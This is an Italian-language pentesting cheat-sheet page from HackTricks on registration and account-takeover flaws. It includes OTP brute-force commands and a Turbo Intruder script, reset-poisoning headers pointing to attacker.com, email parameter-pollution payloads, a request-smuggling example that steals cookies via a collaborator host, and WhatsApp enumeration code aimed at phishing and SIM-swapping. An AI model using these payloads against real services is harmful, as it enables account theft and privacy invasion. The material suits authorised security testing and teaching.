# Vulnerabilità di Registrazione & Takeover

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Prova a generare usando un username esistente
- Prova a variare l'email:
- maiuscole
- +1@
- aggiungi qualche punto nell'email
- caratteri speciali nel nome dell'email (%00, %09, %20)
- Inserisci caratteri vuoti dopo l'email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prova trucchi di canonicalization del provider email (dipende dal servizio):
- Gmail ignores dots and subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Alcuni provider non fanno distinzione tra maiuscole/minuscole nella local-part
- Alcuni provider accettano unicode confusables. Try homoglyphs and soft hyphen `\u00AD` within the local-part
- Abusa di questi per: bypassare i controlli di unicità, ottenere account/inviti duplicati allo workspace, o bloccare le registrazioni della vittima (DoS temporaneo) mentre prepari un takeover

### Enumerazione username

Verifica se puoi capire quando un username è già stato registrato all'interno dell'applicazione.

- Messaggi di errore diversi o codici di stato HTTP differenti
- Differenze di timing (un utente esistente può innescare lookup verso IdP/DB)
- Autocompletamento del form di registrazione con i dati del profilo per email note
- Controlla i flussi team/invite: inserire un'email può rivelare se esiste un account

### Password Policy

Durante la creazione di un utente, verifica la password policy (controlla se puoi usare password deboli).\
In tal caso potresti provare a bruteforce le credenziali.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) per imparare come tentare account takeovers o estrarre informazioni tramite **SQL Injections** nei form di registrazione.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Una volta registrato, prova a cambiare l'email e verifica se la modifica è correttamente validata o se è possibile impostarla su email arbitrarie.

### More Checks

- Verifica se puoi usare **disposable emails** (mailinator, yopmail, 1secmail, ecc.) o bypassare la blocklist con subaddressing come `victim+mailinator@gmail.com`
- Password **lunghe** (>200) causano **DoS**
- **Controlla i rate limits sulla creazione degli account**
- Usa username@**burp_collab**.net e analizza il **callback**
- Se è usata la verifica con numero di telefono, verifica i casi limite di parsing/injection del numero

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

I messenger centrati sul numero di telefono espongono una **presence oracle** ogni volta che il client sincronizza i contatti. Replaying WhatsApp’s discovery requests storicamente ha fornito **>100M lookups per hour**, permettendo enumerazioni quasi complete degli account.

**Attack workflow**

1. **Instrument an official client** per catturare la richiesta di upload della rubrica (authenticated blob of normalized E.164 numbers). Riproducila con numeri generati dall'attaccante riutilizzando gli stessi cookie/token del dispositivo.
2. **Batch numbers per request**: WhatsApp accetta migliaia di identificatori e restituisce registered/unregistered più metadata (business, companion, ecc.). Analizza le risposte offline per costruire liste target senza messaggiare le vittime.
3. **Horizontally scale** l'enumerazione con SIM banks, cloud devices o residential proxies in modo che il throttling per account/IP/ASN non si attivi.

Dialing-plan modeling

Modella il dialing plan di ogni paese per scartare i candidati non validi. Il dataset NDSS (`country-table.*`) elenca i prefissi nazionali, la densità di adozione e la ripartizione per piattaforma in modo da poter dare priorità agli intervalli con più probabilità di successo. Esempio di codice di seeding:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritizza i prefissi che corrispondono a allocazioni reali (Mobile Country Code + National Destination Code) prima di interrogare l oracle per mantenere utile il throughput.

**Trasformare le enumerazioni in attacchi mirati**

- Inserisci leaked phone numbers (e.g., Facebook’s 2021 breach) nell oracle per capire quali identità sono ancora attive prima di phishing, SIM-swapping o spamming.
- Segmenta i censimenti per paese/OS/tipo di app per trovare regioni con filtri SMS deboli o con ampia adozione di WhatsApp Business per social engineering localizzato.

**Public-key reuse correlation**

WhatsApp espone la X25519 identity key di ogni account durante il setup della sessione. Richiedi il materiale d'identità per ogni numero enumerato e deduplica le chiavi pubbliche per rivelare account farm, client clonati o firmware insicuro — le chiavi condivise deanonimizzano le operazioni multi-SIM.

## Verifica Email/Telefono debole (OTP/Magic Link)

I flussi di registrazione spesso verificano la proprietà tramite un OTP numerico o un token magic-link. Difetti tipici:

- OTP prevedibile o breve (4–6 cifre) senza un'efficace rate limiting o tracciamento IP/device. Prova tentativi paralleli e rotazione di header/IP.
- Riutilizzo dell'OTP tra azioni o account, o non vincolato all'utente/azione specifica (es. lo stesso codice funziona per login e signup, o funziona dopo che l'email è stata cambiata).
- Multi-value smuggling: alcuni backend accettano più codici e verificano se uno corrisponde. Prova:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distingui codici errati, scaduti o appartenenti a un altro utente tramite status/messaggio/lunghezza del body.
- Token non invalidati dopo il successo o dopo il cambiamento di password/email.
- Il token di verifica non è legato a user agent/IP permettendo il completamento cross-origin da pagine controllate dall'attaccante.

Esempio di bruteforce con ffuf contro un endpoint JSON OTP:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Indovinamento parallelo/concorrenziale per bypassare lockout sequenziali (usa Turbo Intruder in Burp):

<details>
<summary>Snippet di Turbo Intruder per saturare tentativi OTP a 6‑cifre</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Prova il racing sulla verifica: invia lo stesso OTP valido simultaneamente in due sessioni; a volte una sessione diventa un attacker account verificato mentre il flusso della victim va comunque a buon fine.
- Testa anche Host header poisoning sui link di verifica (come reset poisoning qui sotto) per leak o per completare la verifica su un host controllato dall'attacker.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Una classe potente di problemi si verifica quando un attacker compie azioni sull'email della victim prima che questa crei l'account, per poi riconquistare l'accesso in un secondo momento.

Tecniche chiave da testare (adattare ai flussi del target):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Suggerimenti pratici

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Richiedi il reset della password al tuo indirizzo email
2. Clicca sul link di reset della password
3. Non cambiare la password
4. Clicca su qualsiasi sito di terze parti (es.: Facebook, Twitter)
5. Intercetta la richiesta nel proxy di Burp Suite
6. Controlla se l'header referer sta leaking il token di reset della password.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercetta la richiesta di password reset in Burp Suite
2. Aggiungi o modifica i seguenti header in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Inoltra la richiesta con l'header modificato\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Cerca un URL di reset password basato sul _host header_ come : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaccante deve effettuare il login con il proprio account e andare alla funzionalità **Change password**.
2. Avvia Burp Suite e intercetta la richiesta\
3. Inviarla alla scheda repeater e modificare i parametri: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Il password reset token dovrebbe essere generato in modo casuale e unico ogni volta.\
Cerca di determinare se il token scade o se è sempre lo stesso; in alcuni casi l'algoritmo di generazione è debole e può essere indovinato. Le seguenti variabili potrebbero essere usate dall'algoritmo.

- Timestamp
- UserID
- Email dell'utente
- Nome e cognome
- Data di nascita
- Cryptography
- Solo numeri
- Sequenza di token corta (caratteri tra \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Genera una richiesta di password reset usando l'API/UI per una email specifica, es.: test@mail.com
2. Ispeziona la risposta del server e verifica la presenza di `resetToken`
3. Poi usa il token in un URL come `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrati sul sistema con uno username identico a quello della vittima, ma con spazi inseriti prima e/o dopo lo username, es.: `"admin "`
2. Richiedi un password reset con il tuo username malevolo.
3. Usa il token inviato alla tua email e resetta la password della vittima.
4. Accedi all'account della vittima con la nuova password.

La piattaforma CTFd era vulnerabile a questo attacco.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trova una XSS all'interno dell'applicazione o in un sottodominio se i cookie sono scoped al dominio padre: `*.domain.com`
2. Leak the current **sessions cookie**
3. Autenticati come l'utente usando il cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** per rilevare il tipo di HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Crea una richiesta che sovrascriverà il `POST / HTTP/1.1` con i seguenti dati:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con l'obiettivo di effettuare un open redirect delle vittime verso burpcollab e rubare i loro cookie\
3. La richiesta finale potrebbe essere simile alla seguente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Report Hackerone che mostrano lo sfruttamento di questo bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Compromissione dell'account via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea un payload per il CSRF, es.: “HTML form with auto submit for a password change”
2. Invia il payload

### Compromissione dell'account via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token potrebbe essere usato per autenticare un utente.

- Modifica il JWT con un altro User ID / Email
- Verifica la presenza di una firma JWT debole


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert su email esistente)

Alcuni signup handler eseguono un upsert quando l'email fornita è già presente. Se l'endpoint accetta un body minimo con email e password e non impone la verifica della ownership, inviare l'email della vittima sovrascriverà la sua password pre-auth.

- Scoperta: raccogli nomi di endpoint da bundled JS (o dal traffico dell'app mobile), poi fai fuzz sui percorsi base come /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Indicazioni sul metodo: una GET che restituisce messaggi come "Only POST request is allowed." spesso indica il verbo corretto e che è atteso un body JSON.
- Body minimo osservato in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Esempio di PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impatto: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## Riferimenti

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
